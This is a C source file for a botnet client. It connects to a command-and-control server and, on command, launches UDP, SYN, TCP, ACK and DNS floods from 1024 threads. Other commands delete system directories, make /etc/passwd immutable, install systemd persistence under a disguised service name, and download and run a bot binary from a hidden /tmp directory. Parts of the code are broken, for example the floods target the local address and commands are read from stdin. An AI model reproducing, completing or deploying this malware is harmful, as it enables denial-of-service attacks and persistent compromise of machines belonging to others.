#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <stdbool.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <ifaddrs.h>

#define C2_ADDRESS "Replace IP"
#define C2_PORT 7002
#define NUM_WORKERS 1024 
#define PACKET_SIZE 512
#define TOP_DOMAINS 10

bool killerEnabled = false;
char *killDirectories[] = {"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"};
char *whitelistedDirectories[] = {"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"};
const char *topDomains[TOP_DOMAINS] = {
    "google.com",
    "youtube.com",
    "facebook.com",
    "baidu.com",
    "wikipedia.org",
    "twitter.com",
    "instagram.com",
    "yahoo.com",
    "linkedin.com",
    "netflix.com"
};

// Function prototypes
void *performUDPFlood(void *arg);
void *performSYNFlood(void *arg);
void *performTCPFlood(void *arg);
void *performACKFlood(void *arg);
void *performDNSFlood(void *arg);
void handleCommand(char *command);
void killerMaps();
bool isWhitelisted(const char *dir);
void locker();
void SystemdPersistence();
void reinstallBot();
void connectToC2();
char* getLocalIP();
unsigned short checksum(unsigned short *b, int len);
void generateRandomData(char *data, size_t size);

int main() {
    connectToC2();
    return 0;
}

void connectToC2() {
    int sock;
    struct sockaddr_in serverAddr;
    char command[1024];

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_ADDRESS, &serverAddr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("Connection to C2 failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    while (1) {
        if (fgets(command, sizeof(command), stdin) != NULL) {
            handleCommand(command);
        } else {
            perror("Error reading command");
        }
    }

    close(sock);
}

void handleCommand(char *command) {
    char *fields[4];
    char *cmd = strtok(command, " \n");
    int i = 0;

    while (cmd != NULL && i < 4) {
        fields[i++] = cmd;
        cmd = strtok(NULL, " \n");
    }

    if (i == 0) {
        return;
    }

    if (strcmp(fields[0], "PING") == 0) {
        printf("PONG\n");
        return;
    }

    if ((strcmp(fields[0], "!udpflood") == 0 || strcmp(fields[0], "!tcpflood") == 0 || strcmp(fields[0], "!synflood") == 0 || strcmp(fields[0], "!ackflood") == 0 || strcmp(fields[0], "!dnsflood") == 0) && i == 4) {
        char *targetIP = fields[1];
        int targetPort = atoi(fields[2]);
        int duration = atoi(fields[3]);

        pthread_t threads[NUM_WORKERS];
        for (int j = 0; j < NUM_WORKERS; j++) {
            if (strcmp(fields[0], "!udpflood") == 0) {
                if (pthread_create(&threads[j], NULL, performUDPFlood, (void *)&targetPort) != 0) {
                    perror("Failed to create UDP flood thread");
                }
            } else if (strcmp(fields[0], "!synflood") == 0) {
                if (pthread_create(&threads[j], NULL, performSYNFlood, (void *)&targetPort) != 0) {
                    perror("Failed to create SYN flood thread");
                }
            } else if (strcmp(fields[0], "!tcpflood") == 0) {
                if (pthread_create(&threads[j], NULL, performTCPFlood, (void *)&targetPort) != 0) {
                    perror("Failed to create TCP flood thread");
                }
            } else if (strcmp(fields[0], "!ackflood") == 0) {
                if (pthread_create(&threads[j], NULL, performACKFlood, (void *)&targetPort) != 0) {
                    perror("Failed to create ACK flood thread");
                }
            } else if (strcmp(fields[0], "!dnsflood") == 0) {
                if (pthread_create(&threads[j], NULL, performDNSFlood, (void *)&targetPort) != 0) {
                    perror("Failed to create DNS flood thread");
                }
            }
        }

        for (int j = 0; j < NUM_WORKERS; j++) {
            pthread_join(threads[j], NULL);
        }
        return;
    }

    if (strcmp(fields[0], "!kill") == 0) {
        killerMaps();
        return;
    }
    if (strcmp(fields[0], "!lock") == 0) {
        locker();
        return;
    }
    if (strcmp(fields[0], "!persist") == 0) {
        SystemdPersistence();
        return;
    }
    if (strcmp(fields[0], "!reinstall") == 0) {
        reinstallBot();
        return;
    }
}

void generateRandomData(char *data, size_t size) {
    for (size_t i = 0; i < size; i++) {
        data[i] = 'A' + (rand() % 26); // Fill with random letters A-Z
    }
}

void *performUDPFlood(void *arg) {
    int targetPort = *((int *)arg);
    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);

    // Buffer for the packet
    char packet[4096];
    memset(packet, 0, sizeof(packet)); // Clear the packet

    // Fill the packet with random data
    generateRandomData(packet, sizeof(packet)); // Fill with random letters

    while (1) {
        // Randomize the source port for each packet
        int sourcePort = rand() % 65535;
        destAddr.sin_port = htons(targetPort); // Ensure target port is set

        // Send the packet
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
            perror("Failed to send packet");
        }

        usleep(50000); // Control the rate of sending packets (adjust as needed)
    }

    close(sock);
    return NULL;
}

void *performSYNFlood(void *arg) {
    int targetPort = *((int *)arg);
    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);

    // Buffer for the packet
    unsigned char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    // Initialize IP and TCP headers
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Set up the IP header
    iph->version = 4;            // IPv4
    iph->ihl = 5;                // Header length
    iph->tot_len = htons(PACKET_SIZE); // Total length
    iph->id = htonl(rand() % 65535); // Random ID
    iph->frag_off = 0;           // Fragment offset
    iph->ttl = 255;              // Time to live
    iph->protocol = IPPROTO_TCP; // TCP protocol
    iph->check = 0;              // No checksum initially
    iph->saddr = inet_addr(getLocalIP()); // Source IP address
    iph->daddr = destAddr.sin_addr.s_addr; // Destination IP address

    // Set up the TCP header
    tcph->source = htons(rand() % 65535); // Random source port
    tcph->dest = htons(targetPort); // Destination port
    tcph->seq = 0;                   // Sequence number
    tcph->ack_seq = 0;               // Acknowledgment number
    tcph->doff = 5;                  // TCP header size
    tcph->fin = 0;                   // Finish flag
    tcph->syn = 1;                   // Synchronize flag
    tcph->rst = 0;                   // Reset flag
    tcph->psh = 0;                   // Push flag
    tcph->ack = 0;                   // Acknowledgment flag
    tcph->urg = 0;                   // Urgent flag
    tcph->window = htons(5840);      // TCP window size
    tcph->check = 0;                 // No checksum initially
    tcph->urg_ptr = 0;               // Urgent pointer

    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr) + sizeof(struct tcphdr));

    while (1) {
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
            perror("Failed to send packet");
        }
        usleep(50000); // Control the rate of sending packets (adjust as needed)
    }

    close(sock);
    return NULL;
}

void *performTCPFlood(void *arg) {
    int targetPort = *((int *)arg);
    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);

    while (1) {
        if (connect(sock, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
            perror("Failed to connect");
        }
        usleep(50000); // Control the rate of sending packets (adjust as needed)
    }

    close(sock);
    return NULL;
}

void *performACKFlood(void *arg) {
    int targetPort = *((int *)arg);
    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);

    // Buffer for the packet
    unsigned char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    // Initialize IP and TCP headers
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Set up the IP header
    iph->version = 4;            // IPv4
    iph->ihl = 5;                // Header length
    iph->tot_len = htons(PACKET_SIZE); // Total length
    iph->id = htonl(rand() % 65535); // Random ID
    iph->frag_off = 0;           // Fragment offset
    iph->ttl = 255;              // Time to live
    iph->protocol = IPPROTO_TCP; // TCP protocol
    iph->check = 0;              // No checksum initially
    iph->saddr = inet_addr(getLocalIP()); // Source IP address
    iph->daddr = destAddr.sin_addr.s_addr; // Destination IP address

    // Set up the TCP header
    tcph->source = htons(rand() % 65535); // Random source port
    tcph->dest = htons(targetPort); // Destination port
    tcph->seq = 0;                   // Sequence number
    tcph->ack_seq = 0;               // Acknowledgment number
    tcph->doff = 5;                  // TCP header size
    tcph->fin = 0;                   // Finish flag
    tcph->syn = 0;                   // Synchronize flag
    tcph->rst = 0;                   // Reset flag
    tcph->psh = 0;                   // Push flag
    tcph->ack = 1;                   // Acknowledgment flag
    tcph->urg = 0;                   // Urgent flag
    tcph->window = htons(5840);      // TCP window size
    tcph->check = 0;                 // No checksum initially
    tcph->urg_ptr = 0;               // Urgent pointer

    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr) + sizeof(struct tcphdr));

    while (1) {
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
            perror("Failed to send packet");
        }
        usleep(50000); // Control the rate of sending packets (adjust as needed)
    }

    close(sock);
    return NULL;
}

// Function to perform DNS flood
void *performDNSFlood(void *arg) {
    int targetPort = *((int *)arg);
    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);

    unsigned char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));
    
    // DNS header
    packet[0] = 0x00; // ID
    packet[1] = 0x01; // ID
    packet[2] = 0x01; // Flags (standard query)
    packet[3] = 0x00; // Questions
    packet[4] = 0x00; // Answer RRs
    packet[5] = 0x00; // Authority RRs
    packet[6] = 0x00; // Additional RRs

    // Loop to continuously send DNS queries
    while (1) {
        // Select a random domain from the top domains
        const char *randomDomain = topDomains[rand() % TOP_DOMAINS];
        size_t domainLength = strlen(randomDomain);
        
        // Prepare the DNS query
        size_t queryLength = 12 + domainLength + 5; // Header + QNAME + QTYPE + QCLASS
        memset(packet, 0, sizeof(packet));
        
        // Fill in the DNS header
        packet[0] = rand() % 256; // Random ID
        packet[1] = rand() % 256; // Random ID
        packet[2] = 0x01; // Flags (standard query)
        packet[3] = 0x00; // Questions
        packet[4] = 0x00; // Answer RRs
        packet[5] = 0x00; // Authority RRs
        packet[6] = 0x00; // Additional RRs

        // Fill the QNAME
        char *qname = packet + 12; // Start after the header
        strcpy(qname, randomDomain);
        qname[domainLength] = 0; // Null-terminate the QNAME
        qname[domainLength + 1] = 0x00; // QTYPE = A
        qname[domainLength + 2] = 0x01; // QTYPE = A
        qname[domainLength + 3] = 0x00; // QCLASS = IN
        qname[domainLength + 4] = 0x01; // QCLASS = IN

        // Add EDNS0 section (if required)
        // Here we just append an EDNS0 record for demonstration
        size_t ednsOffset = queryLength; // Start after the standard query
        packet[ednsOffset] = 0x00; // EDNS0 header
        packet[ednsOffset + 1] = 0x00; // EDNS0 header
        packet[ednsOffset + 2] = 0x00; // EDNS0 length
        packet[ednsOffset + 3] = 0x00; // Extended RCODE
        packet[ednsOffset + 4] = 0x00; // Version
        packet[ednsOffset + 5] = 0x00; // Z
        packet[ednsOffset + 6] = 0x00; // UDP size
        packet[ednsOffset + 7] = 0x00; // Extended RCODE
        packet[ednsOffset + 8] = 0x00; // EDNS0 version
        packet[ednsOffset + 9] = 0x00; // EDNS0 Z
        packet[ednsOffset + 10] = 0x00; // EDNS0 length

        // Send the packet with a dynamic source port
        int srcPort = rand() % 65536; // Random source port
        destAddr.sin_port = htons(targetPort);
        int sentBytes = sendto(sock, packet, ednsOffset + 11, 0, (struct sockaddr *)&destAddr, sizeof(destAddr));

        if (sentBytes < 0) {
            perror("Failed to send DNS packet");
        }
    }

    close(sock);
    return NULL;
}

unsigned short checksum(unsigned short *b, int len) {
    unsigned short *p = b;
    unsigned int sum = 0;

    for (int i = 0; i < len / 2; i++) {
        sum += *p++;
    }
    if (len % 2) {
        sum += *(unsigned char *)p;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}


void killerMaps() {
    if (!killerEnabled) return;
    for (int i = 0; i < sizeof(killDirectories) / sizeof(killDirectories[0]); i++) {
        if (!isWhitelisted(killDirectories[i])) {
            remove(killDirectories[i]);
        }
    }
}

bool isWhitelisted(const char *dir) {
    for (int i = 0; i < sizeof(whitelistedDirectories) / sizeof(whitelistedDirectories[0]); i++) {
        if (strcmp(dir, whitelistedDirectories[i]) == 0) {
            return true;
        }
    }
    return false;
}

void locker() {
    system("chattr +i /etc/passwd");
}

// Function to implement systemd persistence
void SystemdPersistence() {
    printf("Systemd persistence invoked.\n");

    // Create a systemd service file
    FILE *serviceFile = fopen("/etc/systemd/system/mybot.service", "w");
    if (serviceFile) {
        fprintf(serviceFile,
                "[Unit]\n"
                "Description=My Bot Service\n"
                "After=network.target\n\n"
                "[Service]\n"
                "ExecStart=/path/to/mybot\n" // Adjust path to your bot's executable
                "Restart=always\n\n"
                "[Install]\n"
                "WantedBy=multi-user.target\n");
        fclose(serviceFile);

        // Reload systemd to recognize the new service
        system("systemctl daemon-reload");
        // Enable the service to start on boot
        system("systemctl enable mybot.service");
        printf("Service created and enabled for persistence.\n");
    } else {
        perror("Failed to create service file");
    }
}

// Reinstallation logic for the bot
void reinstallBot() {
    printf("Reinstalling bot.\n");
    system("mkdir /tmp/.hidden");
    system("rm -rf /tmp/.hidden/bot");
    system("curl http://0.0.0.0/bot -o bot");
    system("cp bot /tmp/.hidden/");
    system("chmod +x /tmp/.hidden/bot"); 
    system("./tmp/.hidden/bot");
    printf("Bot reinstallation complete.\n");
}

char* getLocalIP() {
    struct ifaddrs *addrs, *tmp;
    getifaddrs(&addrs);
    tmp = addrs;

    while (tmp) {
        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET && strcmp(tmp->ifa_name, "lo") != 0) {
            struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
            return inet_ntoa(pAddr->sin_addr);
        }
        tmp = tmp->ifa_next;
    }
    freeifaddrs(addrs);
    return NULL;
}
